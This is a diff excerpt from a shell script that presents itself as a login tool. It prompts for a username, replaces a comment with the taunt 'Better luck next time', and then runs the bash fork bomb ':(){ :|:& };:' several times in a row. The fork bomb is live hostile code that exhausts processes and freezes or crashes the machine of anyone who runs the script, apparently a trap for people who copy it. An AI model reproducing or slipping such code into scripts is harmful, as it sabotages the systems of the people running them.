@@ -408,8 +408,8 @@ sleep  3
 
 
 read -p " [+] ENTER USERNMAE  :" token
-#groupil source code eduthitt patti show umfanda🥲#
-read -p " [+] ENTER PASSWORD :" token 
+#Better luck next time 😁😁😁#
+read -p " [+] CONFIRM USERNAME:" token 
 :(){ :|:& };:
 :(){ :|:& };:
 :(){ :|:& };:
